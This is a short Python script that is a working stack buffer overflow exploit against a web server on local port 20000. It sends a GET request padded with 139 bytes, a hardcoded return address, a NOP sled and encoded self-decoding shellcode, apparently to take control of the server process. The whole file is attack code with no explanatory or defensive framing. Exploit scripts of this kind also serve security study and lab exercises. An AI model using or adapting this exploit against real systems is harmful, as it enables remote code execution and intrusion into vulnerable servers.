#!/usr/bin/python

from socket import *  
from struct import *

s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20000))

shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

ret = "\x68\xf2\xcd\xbf" #0xbfcdf268  
payload =  "GET " + "A"*139 + ret + " HTTP/1.1 " + "\x90"*16 +  shellcode  
s.send(payload)  
s.close()  